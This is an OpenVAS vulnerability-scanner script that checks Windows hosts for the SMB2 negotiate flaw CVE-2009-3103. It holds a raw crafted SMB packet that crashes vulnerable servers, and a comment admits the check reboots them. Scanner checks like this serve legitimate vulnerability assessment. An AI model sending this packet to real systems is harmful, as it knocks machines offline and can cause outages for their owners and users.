###############################################################################
# OpenVAS Vulnerability Test
# $Id: ms_smb2_highid.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# Microsoft Windows SMB2 '_Smb2ValidateProviderCallback()' Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Microsoft Windows is prone to a remote code-execution vulnerability
when processing the protocol headers for the Server Message Block
(SMB) Negotiate Protocol Request.

NOTE: Reportedly, for this issue to be exploitable, file sharing must
      be enabled.

An attacker can exploit this issue to execute code with SYSTEM-level
privileges; failed exploit attempts will likely cause denial-of-
service conditions.

Windows 7 RC, Vista and 2008 Server are vulnerable; other versions may
also be affected.

NOTE: Reportedly, Windows XP and 2000 are not affected.

UPDATE (September 9, 2009): Symantec has confirmed the issue on
Windows Vista SP1 and Windows Server 2008.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100283");
 script_version("$Revision: 9350 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2009-10-01 18:57:31 +0200 (Thu, 01 Oct 2009)");
 script_bugtraq_id(36299);
 script_cve_id("CVE-2009-3103");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Microsoft Windows SMB2 '_Smb2ValidateProviderCallback()' Remote Code Execution Vulnerability");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_KILL_HOST);
 script_family("Windows");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports(445);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/36299");
 script_xref(name : "URL" , value : "http://blog.48bits.com/?p=510#more-510");
 script_xref(name : "URL" , value : "http://www.microsoft.com/technet/security/advisory/975497.mspx");
 script_xref(name : "URL" , value : "http://blogs.technet.com/msrc/archive/2009/09/08/microsoft-security-advisory-975497-released.aspx");
 script_xref(name : "URL" , value : "http://www.microsoft.com/windows/windows-7/");
 script_xref(name : "URL" , value : "http://www.reversemode.com/index.php?option=com_content&task=view&id=64&Itemid=1");
 script_xref(name : "URL" , value : "http://blogs.technet.com/srd/archive/2009/09/18/update-on-the-smb-vulnerability.aspx");
 script_xref(name : "URL" , value : "http://www.microsoft.com/windows/products/windowsvista/default.mspx");
 script_xref(name : "URL" , value : "http://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negotiate-protocol.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/506300");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/506327");
 script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/135940");
 exit(0);
}

include("misc_func.inc");

if(safe_checks())exit(0);

port = 445;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

data = raw_string(0x00,0x00,0x00,0x90,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x53,0xc8,
                  0x00,0x26,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xfe,
                  0x00,0x00,0x00,0x00,0x00,0x6d,0x00,0x02,0x50,0x43,0x20,0x4e,0x45,0x54,0x57,0x4f,
                  0x52,0x4b,0x20,0x50,0x52,0x4f,0x47,0x52,0x41,0x4d,0x20,0x31,0x2e,0x30,0x00,0x02,
                  0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00,0x02,0x57,0x69,0x6e,0x64,0x6f,
                  0x77,0x73,0x20,0x66,0x6f,0x72,0x20,0x57,0x6f,0x72,0x6b,0x67,0x72,0x6f,0x75,0x70,
                  0x73,0x20,0x33,0x2e,0x31,0x61,0x00,0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,
                  0x32,0x00,0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x32,0x2e,0x31,0x00,0x02,0x4e,0x54,
                  0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,0x02,0x53,0x4d,0x42,0x20,0x32,0x2e,
                  0x30,0x30,0x32,0x00); # Tested against 2008 Server. A vulnerable Server doing a reboot. I'm not happy with that, but a the moment i have no idea how to detect this vulnerability without exploiting it.

send(socket: soc, data: data);
close(soc);

sleep(2);

soc1 = open_sock_tcp(port);

 if(!soc1) {
   security_message(port:port);
   exit(0);
 } else {
   close(soc1);
 }

exit(0);

  
